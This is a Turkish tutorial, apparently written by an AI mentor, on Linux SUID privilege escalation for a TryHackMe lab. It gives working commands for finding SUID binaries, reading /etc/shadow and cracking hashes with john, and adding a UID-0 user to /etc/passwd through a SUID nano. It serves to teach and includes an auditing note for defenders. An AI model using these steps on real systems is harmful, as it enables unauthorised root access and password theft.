### 1\. Temel Kavram: Normal İzinler ve SUID'nin Çözdüğü "Problem"

Bildiğin gibi, bir Linux sisteminde her dosyanın bir **sahibi** (user) ve bir **grubu** (group) vardır. İzinler de bu üç kategori için verilir: Sahip, Grup ve Diğerleri (others). Bu izinler okuma (`r`), yazma (`w`) ve çalıştırma (`x`)'dır.

Normalde, bir programı çalıştırdığında, o program **senin kullanıcı yetkilerinle** çalışır. Örneğin, `karen` kullanıcısı olarak `cat /etc/shadow` komutunu çalıştırdığında, sistem "Hayır, `karen`'in bu dosyayı okuma izni yok" der ve başarısız olur.

Peki, `karen` kullanıcısının kendi şifresini değiştirmesi gerektiğinde ne olur? Şifreler `/etc/shadow` dosyasında tutulur ve bu dosyayı sadece `root` okuyup yazabilir. İşte **SUID (Set User ID)** burada devreye girer.

**SUID'nin Amacı:** Bir dosyaya SUID biti atandığında, o dosya çalıştırıldığı an, çalıştıran kullanıcının yetkileriyle değil, **dosya sahibinin yetkileriyle** çalışır.

Klasik örnek `passwd` komutudur:

Bash

```
$ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 63960 May 13  2021 /usr/bin/passwd
   ^
   |-- Bu 's' harfi SUID bitini gösterir.
```

Gördüğün gibi `passwd` programının sahibi `root` ve 'x' (execute) izni yerine **'s'** harfi var. Bu sayede, `karen` kullanıcısı `passwd` komutunu çalıştırdığında, bu program geçici olarak `root` yetkileriyle çalışır ve `/etc/shadow` dosyasına yazma işlemi yapabilir.

* * *

### 2\. Zafiyet Nerede Başlıyor? SUID Ayarlı Dosyaları Tespit Etme

SUID, `passwd` gibi meşru komutlar için bir gerekliliktir. Ancak bir sistem yöneticisi yanlışlıkla `nano`, `vim`, `cp`, `find` gibi normalde SUID gerektirmeyen bir programa SUID biti atarsa, bu durum bir yetki yükseltme zafiyeti doğurur.

Metinde belirtilen komut, tam olarak bu "yanlış yapılandırılmış" dosyaları bulmak içindir:

Bash

```
find / -type f -perm -04000 -ls 2>/dev/null
```

Bu komutu parçalara ayıralım:

- `find /`: Kök dizinden (`/`) başlayarak tüm sistemi tara.
- `-type f`: Sadece dosyaları ara (dizinleri değil).
- `-perm -04000`: İzinleri arasında **SUID bitini (`4000`)** barındıran dosyaları bul. Buradaki `-` "en az bu izinler olsun" anlamına gelir.
- `-ls`: Bulunan dosyaları `ls -l` formatında detaylıca listele.
- `2>/dev/null`: Komut çalışırken karşılaşacağı "Permission denied" gibi hata mesajlarını (`stderr` veya `2`) gösterme, bunları çöp kutusuna (`/dev/null`) yönlendir. Bu, çıktıyı temiz tutar.

Bu komutu çalıştırdığında, karşına sistemdeki tüm SUID'li dosyaların bir listesi çıkar.

* * *

### 3\. Sömürü Stratejisi: GTFOBins ve Yaratıcı Düşünme

Listeyi elde ettiğinde, bir pentester olarak ilk durağın **GTFOBins** olmalıdır. Bu site, Linux komutlarının "alternatif" kullanım amaçlarını barındıran bir hazinedir.

- **GTFOBins Linki:** https://gtfobins.github.io/
- **Filtrelenmiş SUID Linki:** https://gtfobins.github.io/#+suid

Eğer bulduğun program (örneğin `find`, `nmap`, `bash`) GTFOBins'in SUID listesindeyse, genellikle tek bir komutla `root` olursun.

Ancak TryHackMe senaryosunda olduğu gibi, `nano` metin editörünün SUID'li olması durumu biraz daha yaratıcılık gerektirir. GTFOBins'te `nano` için doğrudan bir "root shell al" komutu yoktur. Bu noktada mentor olarak sana şunu sormanı öneririm: "**Sahibi `root` olan bu program, `root` yetkileriyle neler yapabilir?**"

Cevap: `root`'un okuyabildiği her dosyayı okuyabilir ve yazabildiği her dosyayı yazabilir!

* * *

### 4\. Pratik Senaryolar: `nano` ile Yetki Yükseltme

Metinde anlatılan iki harika senaryoyu inceleyelim.

#### Senaryo A: `/etc/shadow` Dosyasını Okumak

Bu senaryo, dolaylı bir yoldur.

1.  **Zafiyetin Kullanımı:** SUID'li `nano` ile normalde okuyamayacağın `/etc/shadow` dosyasını açarsın.Bash
    
    ```
    # Normal kullanıcıyken bu komut hata verir:
    cat /etc/shadow 
    # Ama SUID'li nano ile çalışır:
    nano /etc/shadow
    ```
    
2.  **Veriyi Çekme:** Dosyanın içeriğini (tüm kullanıcıların parola hash'lerini) kopyalarsın.
    
3.  **Çevrimdışı Kırma:** Kendi makinenizde, `unshadow` aracıyla `/etc/passwd` ve kopyaladığın `/etc/shadow` içeriğini birleştirip `john` veya `hashcat` gibi araçlarla kırılabilecek bir dosya formatı oluşturursun.Bash
    
    ```
    # Kendi makinenizde
    unshadow passwd.txt shadow.txt > crack_me.txt
    john --wordlist=/usr/share/wordlists/rockyou.txt crack_me.txt
    ```
    

**Dezavantajı:** Parolayı kırıp kıramayacağın tamamen parola listene (wordlist) ve hash'in karmaşıklığına bağlıdır. Saatler veya günler sürebilir ve sonuç garantisi yoktur.

#### Senaryo B: `/etc/passwd` Dosyasına Yeni `root` Kullanıcısı Eklemek (En Etkili Yöntem)

Bu yöntem çok daha doğrudan, garantili ve şıktır.

1.  **Yeni Parola Hash'i Oluşturma:** Yeni ekleyeceğin `root` kullanıcısı için bir parola hash'i oluşturman gerekir. `openssl` bunun için harikadır.
    
    Bash
    
    ```
    # Komut: openssl passwd -1 -salt [kullanıcı_adı] [parola]
    openssl passwd -1 -salt mentor siberguvenlik123
    # Çıktı: $1$mentor$H6JgP1dJb2PL3uI5g3p3k/
    ```
    
    Bu komut, `siberguvenlik123` parolasını `mentor` tuzu (salt) ile hash'ler.
    
2.  **`/etc/passwd` Satırını Hazırlama:** `/etc/passwd` dosyasının formatını bilmek kritiktir: `kullanici:parola:UID:GID:aciklama:ev_dizini:kabuk`
    
    `root` yetkilerine sahip bir kullanıcı için UID ve GID **0** olmalıdır. İstediğimiz satır: `mentor:$1$mentor$H6JgP1dJb2PL3uI5g3p3k/:0:0:root:/root:/bin/bash`
    
3.  **Dosyayı Düzenleme:** SUID'li `nano` ile `/etc/passwd` dosyasını açıp bu satırı en sona eklersin.
    
    Bash
    
    ```
    nano /etc/passwd
    ```
    
    (Dosyayı aç, en alta in, hazırladığın satırı yapıştır, `Ctrl+O` ile kaydet, `Ctrl+X` ile çık.)
    
4.  **Yetki Yükseltme:** Artık `mentor` adında, parolası `siberguvenlik123` olan ve `root` yetkilerine sahip bir kullanıcın var!
    
    Bash
    
    ```
    su mentor
    # Parolayı gir: siberguvenlik123
    # whoami
    root
    # id
    uid=0(root) gid=0(root) groups=0(root)
    ```
    
    Tebrikler, artık sistemin tam kontrolü sende! 🚀
    

* * *

### Mentorun Not Defteri ve Sıradaki Görev 📝

- **Ana Fikir:** SUID, bir özellik değil, yanlış yapılandırıldığında devasa bir güvenlik zafiyetidir. Bir programın SUID'li olması, "Bu programı `root` olarak çalıştırabilirim" demenin bir yoludur.
- **Savunma Tarafı (Blue Team):** Sistem yöneticileri, gereksiz yere SUID biti atanmış uygulamaları düzenli olarak denetlemelidir. Yukarıdaki `find` komutu onlar için de bir denetim aracıdır.
- **Unutma:** TryHackMe makinesinde `nano` dışında SUID'li başka bir program daha olduğu belirtiliyor.

**Sıradaki Görevin:**

1.  Hedef makinede `find / -type f -perm -04000 -ls 2>/dev/null` komutunu çalıştır.
2.  `nano` dışındaki diğer SUID'li programı bul.
3.  Bu programın adını GTFOBins'in SUID sayfasında arat.
4.  Eğer bir sömürü yöntemi bulursan, onu uygulamayı dene!

Bulduğun programı ve denediğin adımları benimle paylaşırsan, üzerinden birlikte geçebilir ve olası hataları düzeltebiliriz. Başarılar!